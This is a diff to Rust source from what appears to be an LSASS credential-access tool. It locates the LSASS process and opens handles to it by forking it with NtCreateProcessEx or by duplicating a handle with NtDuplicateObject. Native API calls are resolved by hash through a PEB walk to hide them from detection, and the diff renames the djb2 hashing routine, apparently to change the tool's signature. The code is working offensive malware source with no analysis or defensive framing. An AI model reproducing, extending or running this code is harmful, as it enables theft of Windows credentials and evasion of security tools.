@@ -76,7 +76,7 @@ pub fn find_lsass_pid() -> Option<u32> {
             if name.length > 0 && !name.buffer.is_null() {
                 let name_slice =
                     std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
-                let hash = crate::resolver::djb2_hash_wide(name_slice);
+                let hash = crate::resolver::api_hash_wide(name_slice);
                 if hash == crate::resolver::HASH_NTDLL {
                     ntdll_base = (*entry).dll_base;
                     break;
@@ -96,7 +96,7 @@ pub fn find_lsass_pid() -> Option<u32> {
             ntdll_base,
             advapi32_base: std::ptr::null_mut(),
         };
-        let nqsi_hash = crate::resolver::djb2_hash_const(b"NtQuerySystemInformation");
+        let nqsi_hash = crate::resolver::api_hash_const(b"NtQuerySystemInformation");
         let nqsi_ptr = tmp.ntdll(nqsi_hash);
         if nqsi_ptr.is_none() {
             println!("[-] find_lsass_pid: NtQuerySystemInformation not found in ntdll");
@@ -219,7 +219,7 @@ pub fn open_lsass_fork(pid: u32) -> Result<ProcessHandle, String> {
 
     unsafe {
         let resolver = resolve_ntdll()?;
-        let hash = crate::resolver::djb2_hash(b"NtCreateProcessEx");
+        let hash = crate::resolver::api_hash(b"NtCreateProcessEx");
         let fn_ptr = resolver.ntdll(hash).ok_or("NtCreateProcessEx not found")?;
         let nt_create: FnNtCreateProcessEx = std::mem::transmute(fn_ptr);
 
@@ -275,12 +275,12 @@ pub fn open_lsass_dup(pid: u32) -> Result<ProcessHandle, String> {
 
         let nqsi: FnNtQuerySystemInformation = std::mem::transmute(
             resolver
-                .ntdll(crate::resolver::djb2_hash(b"NtQuerySystemInformation"))
+                .ntdll(crate::resolver::api_hash(b"NtQuerySystemInformation"))
                 .ok_or("NtQuerySystemInformation not found")?,
         );
         let nt_dup: FnNtDuplicateObject = std::mem::transmute(
             resolver
-                .ntdll(crate::resolver::djb2_hash(b"NtDuplicateObject"))
+                .ntdll(crate::resolver::api_hash(b"NtDuplicateObject"))
                 .ok_or("NtDuplicateObject not found")?,
         );
 
@@ -388,7 +388,7 @@ fn resolve_ntdll() -> Result<crate::resolver::ApiResolver, String> {
             let name = &(*entry).base_dll_name;
             if name.length > 0 && !name.buffer.is_null() {
                 let s = std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
-                if crate::resolver::djb2_hash_wide(s) == crate::resolver::HASH_NTDLL {
+                if crate::resolver::api_hash_wide(s) == crate::resolver::HASH_NTDLL {
                     ntdll_base = (*entry).dll_base;
                     break;
                 }
